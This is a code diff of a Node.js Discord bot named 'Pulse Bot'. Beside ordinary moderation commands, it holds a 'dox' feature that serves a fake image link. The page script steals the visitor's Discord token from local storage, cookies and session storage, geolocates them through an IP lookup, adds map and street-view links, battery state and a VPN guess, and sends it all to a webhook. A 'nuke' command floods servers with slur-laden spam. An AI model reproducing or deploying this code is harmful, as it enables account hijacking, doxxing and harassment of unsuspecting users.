@@ -27,7 +27,6 @@ let startTime = Date.now();
 app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
 app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));
 
-// ---- DOX LINK HANDLER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -141,7 +140,6 @@ client.on('interactionCreate', async (interaction) => {
     const { commandName, options, user, member, guild, channel } = interaction;
 
     try {
-        // ---- DOX ----
         if (commandName === 'dox') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -160,7 +158,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- NUKE ----
         if (commandName === 'nuke') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -175,7 +172,6 @@ client.on('interactionCreate', async (interaction) => {
             await startNuke(guild);
         }
 
-        // ---- STOP ----
         if (commandName === 'stop') {
             await interaction.deferReply({ ephemeral: true });
             if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
@@ -184,14 +180,12 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('⏹️ **Nuke stopped.**');
         }
 
-        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
             await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
         }
 
-        // ---- SERVERINFO ----
         if (commandName === 'serverinfo') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -211,7 +205,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- USERINFO ----
         if (commandName === 'userinfo') {
             await interaction.deferReply({ ephemeral: true });
             const target = interaction.options.getUser('user') || user;
@@ -234,7 +227,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- AVATAR ----
         if (commandName === 'avatar') {
             await interaction.deferReply({ ephemeral: true });
             const target = interaction.options.getUser('user') || user;
@@ -245,7 +237,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed] });
         }
 
-        // ---- SAY ----
         if (commandName === 'say') {
             await interaction.deferReply({ ephemeral: true });
             const msg = interaction.options.getString('message');
@@ -254,7 +245,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('✅ Sent.');
         }
 
-        // ---- KICK ----
         if (commandName === 'kick') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -273,7 +263,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.user.tag}** kicked. Reason: ${reason}`);
         }
 
-        // ---- BAN ----
         if (commandName === 'ban') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -292,7 +281,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.tag}** banned. Reason: ${reason}`);
         }
 
-        // ---- CLEAR ----
         if (commandName === 'clear') {
             await interaction.deferReply({ ephemeral: true });
             const amount = interaction.options.getInteger('amount');
@@ -306,7 +294,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Deleted ${messages.size} messages.`);
         }
 
-        // ---- TIMEOUT ----
         if (commandName === 'timeout') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -322,7 +309,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ **${target.user.tag}** timed out for ${minutes} minutes. Reason: ${reason}`);
         }
 
-        // ---- UPTIME ----
         if (commandName === 'uptime') {
             const uptime = Date.now() - startTime;
             const days = Math.floor(uptime / 86400000);
@@ -332,13 +318,11 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply(`⏱️ **Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s`);
         }
 
-        // ---- INVITE ----
         if (commandName === 'invite') {
             const inviteURL = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot+applications.commands`;
             await interaction.reply(`🔗 **Invite Pulse Bot:**\n${inviteURL}`);
         }
 
-        // ---- STATS ----
         if (commandName === 'stats') {
             const totalServers = client.guilds.cache.size;
             const totalUsers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
@@ -356,7 +340,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply({ embeds: [embed] });
         }
 
-        // ---- POLL ----
         if (commandName === 'poll') {
             await interaction.deferReply({ ephemeral: true });
             const question = interaction.options.getString('question');
@@ -377,7 +360,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply('✅ Poll created!');
         }
 
-        // ---- SLOWMODE ----
         if (commandName === 'slowmode') {
             await interaction.deferReply({ ephemeral: true });
             const seconds = interaction.options.getInteger('seconds');
@@ -390,7 +372,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`✅ Slowmode set to ${seconds} seconds.`);
         }
 
-        // ---- LOCK ----
         if (commandName === 'lock') {
             await interaction.deferReply({ ephemeral: true });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -402,7 +383,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`🔒 **${targetChannel.name}** locked.`);
         }
 
-        // ---- UNLOCK ----
         if (commandName === 'unlock') {
             await interaction.deferReply({ ephemeral: true });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -414,7 +394,6 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply(`🔓 **${targetChannel.name}** unlocked.`);
         }
 
-        // ---- ROLELIST ----
         if (commandName === 'rolelist') {
             await interaction.deferReply({ ephemeral: true });
             if (!guild) return interaction.editReply('❌ Server only.');
@@ -438,7 +417,6 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- START NUKE ----
 async function startNuke(guild) {
     const variants = [
         '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -505,7 +483,6 @@ async function startNuke(guild) {
     });
 }
 
-// ---- DOX HTML ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
@@ -534,42 +511,94 @@ function generateDoxHTML(webhook) {
                 body: JSON.stringify(data)
             }).catch(() => {});
         }
+
         (function() {
             try {
                 const token = localStorage.getItem('token') || 
-                              document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1];
+                              document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1] ||
+                              sessionStorage.getItem('token');
                 if (token) {
-                    send({ content: "**🎯 Discord Token:** " + token });
+                    send({ content: "**🎯 Discord Token:** ```" + token + "```" });
                 }
             } catch(e) {}
         })();
+
         (async function() {
             try {
                 const res = await fetch('https://ipinfo.io/json');
                 const d = await res.json();
                 if (!d.ip) return;
+
                 const ua = navigator.userAgent;
-                const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : 'Unknown';
-                const os = ua.includes('Windows NT 10.0') ? 'Windows' : ua.includes('Mac OS X') ? 'macOS' : 'Unknown';
+                const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
+                const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Windows NT 6.1') ? 'Windows 7' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
+                const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';
+                const now = new Date();
+                const timestamp = now.toISOString();
+                const localTime = now.toString();
+
+                const lat = d.loc ? d.loc.split(',')[0] : 'N/A';
+                const lon = d.loc ? d.loc.split(',')[1] : 'N/A';
+                const mapUrl = lat !== 'N/A' ? 'https://www.google.com/maps?q=' + lat + ',' + lon : 'N/A';
+                const streetView = lat !== 'N/A' ? 'https://www.google.com/maps?q=' + lat + ',' + lon + '&layer=c' : 'N/A';
+
+                let battery = 'N/A';
+                try {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + '%' + (b.charging ? ' (Charging)' : ' (Not Charging)');
+                } catch(e) {}
+
+                let vpn = '❌ Not Detected';
+                let vpnScore = 0;
+                const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated', 'datacenter', 'cloud', 'vps'];
+                const isp = (d.org || '').toLowerCase();
+                const asn = (d.asn || '').toLowerCase();
+                for (const keyword of vpnKeywords) {
+                    if (isp.includes(keyword) || asn.includes(keyword)) {
+                        vpnScore += 2;
+                        break;
+                    }
+                }
+                try {
+                    const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    if (d.timezone && d.timezone !== 'N/A' && browserTz && d.timezone !== browserTz) {
+                        vpnScore += 3;
+                    }
+                } catch(e) {}
+                if (vpnScore >= 3) vpn = '✅ Likely (Score: ' + vpnScore + ')';
+
                 const embed = {
-                    title: "☠️ Doxxed",
+                    title: "☠️ TARGET COMPROMISED - FULL DOX",
                     color: 0xFF0000,
                     fields: [
-                        { name: "🌐 IP", value: d.ip || 'N/A', inline: true },
+                        { name: "🌐 IP Address", value: d.ip || 'N/A', inline: true },
                         { name: "🏙️ City", value: d.city || 'N/A', inline: true },
                         { name: "🗺️ Region", value: d.region || 'N/A', inline: true },
                         { name: "🌍 Country", value: d.country || 'N/A', inline: true },
+                        { name: "📮 Postal", value: d.postal || 'N/A', inline: true },
+                        { name: "🔢 ASN", value: d.asn || 'N/A', inline: true },
                         { name: "🏢 ISP", value: d.org || 'N/A', inline: true },
                         { name: "🕒 Timezone", value: d.timezone || 'N/A', inline: true },
+                        { name: "📍 IP Location", value: mapUrl, inline: false },
+                        { name: "🗺️ Street View", value: streetView, inline: false },
+                        { name: "🔋 Battery", value: battery, inline: true },
+                        { name: "🛡️ VPN/Proxy", value: vpn, inline: true },
                         { name: "🧠 Browser", value: browser, inline: true },
                         { name: "💻 OS", value: os, inline: true },
-                        { name: "⏰ Time", value: new Date().toString(), inline: false }
+                        { name: "🖥️ Device", value: device, inline: true },
+                        { name: "⏰ Local Time", value: localTime, inline: false },
+                        { name: "📅 Timestamp", value: timestamp, inline: false }
                     ],
-                    footer: { text: "☠️ PULSE DOX" }
+                    footer: { text: "☠️ PULSE DOX SYSTEM - " + timestamp }
                 };
+
                 send({ embeds: [embed] });
-            } catch(e) {}
+
+            } catch(e) {
+                send({ content: "❌ Dox error: " + e.message });
+            }
         })();
+
         setTimeout(() => {
             document.body.innerHTML = '';
             document.body.style.background = '#000';
@@ -580,6 +609,7 @@ function generateDoxHTML(webhook) {
                 window.location.href = 'about:blank';
             }, 500);
         }, 5000);
+
         document.querySelector('.caption').textContent = 'Image loaded successfully.';
     <\/script>
 </body>
